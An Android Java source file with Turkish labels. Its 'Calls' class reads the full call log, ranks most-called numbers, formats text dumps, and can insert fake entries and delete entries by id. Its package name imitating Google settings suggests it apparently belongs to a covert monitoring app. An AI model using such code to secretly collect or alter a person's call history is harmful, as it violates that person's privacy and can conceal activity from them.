package com.setting.dl.google.googlesettings.phone;


import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.os.Build;
import android.provider.CallLog;
import android.support.annotation.NonNull;
import android.support.annotation.RequiresApi;

import com.setting.dl.google.googlesettings.u;

import java.util.ArrayList;
import java.util.Collections;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Set;


public class Calls {
    
    
    private final Context context;
    private List<Call> calls = new ArrayList<>();
    private final String[] CALL_LOG_COLS = new String[]{
            
            CallLog.Calls.NUMBER,
            CallLog.Calls.DATE,
            CallLog.Calls.TYPE,
            CallLog.Calls.DURATION,
            CallLog.Calls._ID,
            CallLog.Calls.CACHED_NAME,
            CallLog.Calls.IS_READ
    };
    
    
    public Calls(Context context) {
        
        this.context = context;
        getCalls();
    }
    
    @SuppressLint("MissingPermission")
    public void getCalls() {
        
         Cursor call_log = context.getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                CALL_LOG_COLS,
                null,
                null,
                null);
        
        
        if (call_log != null && call_log.moveToFirst()) {
            
            
            int numberCol   = call_log.getColumnIndex(CALL_LOG_COLS[0]);
            int dateCol     = call_log.getColumnIndex(CALL_LOG_COLS[1]);
            int typeCol     = call_log.getColumnIndex(CALL_LOG_COLS[2]);
            int durationCol = call_log.getColumnIndex(CALL_LOG_COLS[3]);
            int idCol       = call_log.getColumnIndex(CALL_LOG_COLS[4]);
            int NameCol     = call_log.getColumnIndex(CALL_LOG_COLS[5]);
            int readCol     = call_log.getColumnIndex(CALL_LOG_COLS[6]);
            
            
            do {
                
                String  number   = call_log.getString(numberCol);
                String  duration = call_log.getString(durationCol);
                String  type     = call_log.getString(typeCol);
                Long  date     = call_log.getLong(dateCol);
                String  id       = call_log.getString(idCol);
                String  name     = call_log.getString(NameCol);
                Boolean read     = call_log.getInt(readCol) == 1;
                
                number = Contacts.normalizeNumber(number);
                
                
                int callType = Integer.valueOf(type);
                
                switch (callType) {
                    
                    case CallLog.Calls.INCOMING_TYPE:
                        type = "Gelen Çağrı";
                        break;
                    
                    case CallLog.Calls.OUTGOING_TYPE:
                        type = "Giden Çağrı";
                        break;
                    
                    case CallLog.Calls.MISSED_TYPE:
                        type = "Cevapsız Çağrı";
                        break;
                    
                    case CallLog.Calls.REJECTED_TYPE:
                        type = "Reddedilen Çağrı";
                        break;
                    
                    case CallLog.Calls.BLOCKED_TYPE:
                        type = "Engellenen Çağrı";
                        break;
                    
                }
    
    
                if (name == null) {
                    
                    name = Contacts.getContactNameWithNumber(context, number);
                    if(name.equals("Kayıtlı değil")) name = number;
                }
                
                //Log.i("Calllogs", number);
                
                calls.add(new Call(
                        number,
                        date,
                        duration,
                        type,
                        id,
                        name,
                        callType,
                        read));
                
            }
            while (call_log.moveToNext());
            
            call_log.close();
        }
        
        Collections.sort(calls);
        //return calls;
    }
    
    public final String enCokArananlar() {
        
        Map<String, Integer> arananNumaralar = new HashMap<>();
        
        for (int i = 0; i < calls.size(); i++) {
            
            
            Call call = calls.get(i);
            
            if (!arananNumaralar.containsKey(call.getNumber())) {
                
                arananNumaralar.put(call.getNumber(), 1);
                
            }
            else {
                
                int value = arananNumaralar.get(call.getNumber());
                
                arananNumaralar.remove(call.getNumber());
                
                arananNumaralar.put(call.getNumber(), ++value);
                
            }
        }
        
        
        @SuppressLint("UseSparseArrays")
        Map<Integer, String> enCokArananlar = new HashMap<>();
        
        for (Map.Entry<String, Integer> list : arananNumaralar.entrySet()) {
            
            enCokArananlar.put(list.getValue(), list.getKey());
            
        }
        
        Set<Integer> times = enCokArananlar.keySet();
        
        int[] degerler = new int[times.size()];
        
        int j = 0;
        
        for (int i : times) {
            
            degerler[j++] = i;
            
        }
        
        for (int i = 0; i < degerler.length - 1; i++) {
            
            for (int k = i + 1; k < degerler.length; k++) {
                
                
                if (degerler[i] < degerler[k]) {
                    
                    int temp = degerler[i];
                    degerler[i] = degerler[k];
                    degerler[k] = temp;
                    
                }
            }
        }
        
        
        StringBuilder value = new StringBuilder();
        
        value.append("EN ÇOK ARANANLAR\n");
        
        value.append("---------------------------------\n");
        
        for (int i : degerler) {
            
            String name = Contacts.getContactNameWithNumber(context, enCokArananlar.get(i));
            
            value.append(u.s("%14s : %d\n", name.equals("Kayıtlı değil") ? enCokArananlar.get(i) : name, i));
            
        }
        
        return value.toString();
        
    }
    
    public class Call implements Comparable<Call>{
        
        String number, duration, type, id, name;
        int intType;
        long date;
        
        
        Boolean isRead;
        
        public Call(String number, long date, String duration,
                    String type, String id, String name, int intType, Boolean isRead) {
            
            this.number = number;
            this.date = date;
            this.type = type;
            this.duration = duration;
            this.id = id;
            this.name = name;
            this.intType = intType;
            this.isRead = isRead;
        }
        
        public Boolean getRead() {return isRead;}
        
        public void setRead(Boolean read) {isRead = read;}
        
        public String getNumber() {return number;}
        
        public long getDate() {return date;}
        
        public String getDuration() {return duration;}
        
        public String getType() {return type;}
        
        public String getId() {return id;}
        
        public String getName() {return name;}
        
        public int getIntType() {return intType;}
        
        
        public Call(Call call) {
            
            number = call.number;
            date = call.date;
            duration = call.duration;
            type = call.type;
            id = call.id;
            name = call.name;
            intType = call.intType;
            isRead = call.isRead;
        }
    
    
        @Override public int compareTo(@NonNull Call o) {
            
            if(date < o.date) return 1;
            if(date > o.date) return -1;
            return 0;
        }
    }
    
    
    
    @Override
    public String toString() {
        
        
        StringBuilder value = new StringBuilder("============================================\n");
        
        for (Call call : calls) {
            
            value.append(u.s("%s\n", call.type));
            value.append("------------\n");
            value.append(u.s("Kişi      : %s\n", call.name == null ? Contacts.getContactNameWithNumber(context, call.number) : call.getName()));
            value.append(u.s("Numara    : %s\n", call.getNumber()));
            value.append(u.s("Tarih     : %s\n", u.getDate(call.getDate())));
            value.append(u.s("Süre      : %s saniye\n", call.getDuration()));
            value.append(u.s("id        : %s\n", call.getId()));
            value.append(u.s("isRead    : %s\n", call.getRead()));
            
            value.append("======================\n");
            
        }
        
        return value.toString();
    }
    
    @SuppressLint("MissingPermission")
    public static void insertPlaceholderCall(ContentResolver contentResolver, String number, String date, String duration, int type, int isRead) {
        
        ContentValues values = new ContentValues();
        values.put(CallLog.Calls.NUMBER, number);
        values.put(CallLog.Calls.DATE, date);
        values.put(CallLog.Calls.IS_READ, isRead);
        values.put(CallLog.Calls.DURATION, duration);
        values.put(CallLog.Calls.TYPE, type);
        values.put(CallLog.Calls.NEW, 1);
        values.put(CallLog.Calls.CACHED_NAME, "");
        values.put(CallLog.Calls.CACHED_NUMBER_TYPE, 0);
        values.put(CallLog.Calls.CACHED_NUMBER_LABEL, "");
        
        contentResolver.insert(CallLog.Calls.CONTENT_URI, values);
    }
    
    @SuppressLint("MissingPermission")
    public static void deleteCallWithId(ContentResolver contentResolver, String id) {
        
        contentResolver.delete(CallLog.Calls.CONTENT_URI, CallLog.Calls._ID + " =? ", new String[]{id});
        
    }
    
    @SuppressLint("MissingPermission")
    public static void deleteCallWithId(ContentResolver contentResolver, String[] ids) {
        
        for (String id : ids) {
            
            deleteCallWithId(contentResolver, id);
        }
    }
    
    public List<Call> getCallsForNumber(String number) {
        
        List<Call> oneCalls = new ArrayList<>();
        
        for (Call call : calls) {
            
            if (call.number.contains(number)) oneCalls.add(call);
        }
        return oneCalls;
    }
    
    public interface ICall<T> extends Contacts.MyPredicate<T> {}
    
    public List<Call> getCalls(ICall<Call> predicate) {
        
        List<Call> callList = new ArrayList<>();
        
        for (Call call : calls) {
            
            if (predicate.test(call)) {
                
                callList.add(call);
            }
        }
        
        return callList;
    }
    
    
    @RequiresApi(api = Build.VERSION_CODES.N)
    public static List<Call> getRejectedCalls(Context context) {
        
        return new Calls(context).getCalls(e -> e.getIntType() == CallLog.Calls.REJECTED_TYPE);
        
    }
    
    @RequiresApi(api = Build.VERSION_CODES.N)
    public static boolean isRejected(Context context, String number, long date) {
        
        List<Call> rejectedCalls = getRejectedCalls(context);
        
        number = Contacts.normalizeNumber(number);
        
        for (Call call : rejectedCalls) {
            
            if (call.getNumber().equals(number) && (Math.abs(date - call.date) < 200)) {
                
                return true;
            }
        }
        
        return false;
    }
    
    
}
